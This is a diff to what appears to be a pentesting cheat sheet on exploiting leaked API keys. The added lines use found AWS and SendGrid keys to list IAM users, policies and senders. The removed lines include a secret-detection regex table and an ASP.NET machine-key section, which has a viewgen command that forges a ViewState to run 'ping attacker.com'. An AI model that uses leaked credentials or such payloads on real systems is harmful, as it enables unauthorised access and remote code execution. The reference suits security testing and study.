@@ -40,6 +40,10 @@ aws s3 ls
 
 # List IAM users
 aws iam list-users
+
+# Check what permissions the key has (useful when access is restricted)
+aws iam get-user
+aws iam list-attached-user-policies --user-name <username>
 ```
 
 ### GitHub Token
@@ -110,60 +114,9 @@ Pattern: `SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}`
 ```bash
 # Verify key
 curl -H "Authorization: Bearer SG.KEY_HERE" https://api.sendgrid.com/v3/user/profile
+
+# List sender identities (note: requires 'Sender Identities' read permission)
+curl -H "Authorization: Bearer SG.KEY_HERE" https://api.sendgrid.com/v3/senders
 ```
 
-### MailChimp API Key
-
-Pattern: `[0-9a-f]{32}-us[0-9]{1,2}`
-
-```bash
-# Get account info
-curl -u "anystring:KEY_HERE" https://usX.api.mailchimp.com/3.0/
-```
-
-## Detection Patterns
-
-| Service | Regex Pattern |
-|---------|---------------|
-| AWS Access Key ID | `AKIA[0-9A-Z]{16}` |
-| AWS Secret Key | `[0-9a-zA-Z/+]{40}` |
-| GitHub PAT | `ghp_[0-9a-zA-Z]{36}` |
-| GitHub OAuth | `gho_[0-9a-zA-Z]{36}` |
-| Google API Key | `AIza[0-9A-Za-z\-_]{35}` |
-| Slack Bot Token | `xoxb-[0-9]{11}-[0-9]{11}-[0-9a-zA-Z]{24}` |
-| Stripe Live Key | `sk_live_[0-9a-zA-Z]{24}` |
-| Stripe Test Key | `sk_test_[0-9a-zA-Z]{24}` |
-| Twilio API Key | `SK[0-9a-fA-F]{32}` |
-| SendGrid API Key | `SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}` |
-| MailChimp | `[0-9a-f]{32}-us[0-9]{1,2}` |
-| RSA Private Key | `-----BEGIN RSA PRIVATE KEY-----` |
-| SSH Private Key | `-----BEGIN OPENSSH PRIVATE KEY-----` |
-
-## Machine Keys
-
-ASP.NET Machine Keys can be used to forge authentication cookies, ViewState, and other signed/encrypted data.
-
-See [Files/MachineKeys.txt](Files/MachineKeys.txt) for a list of known/leaked machine keys.
-
-```xml
-<!-- Example vulnerable web.config -->
-<machineKey
-  validationKey="FOUND_VALIDATION_KEY"
-  decryptionKey="FOUND_DECRYPTION_KEY"
-  validation="SHA1"
-  decryption="AES"
-/>
-```
-
-Use [Machina](https://github.com/0xacb/viewgen) or `ysoserial.net` to exploit leaked machine keys:
-
-```bash
-# Generate malicious ViewState with leaked machine key
-python3 viewgen.py --webconfig web.config -m UAT -c "ping attacker.com"
-```
-
-## References
-
-- [KeyHacks - streaak](https://github.com/streaak/keyhacks)
-- [API Key Checker - daffainfo](https://github.com/daffainfo/all-about-apikey)
-- [Exposed AWS Keys - Truffle Security](https://trufflesecurity.com/blog/exposed-aws-keys)
+### Mail
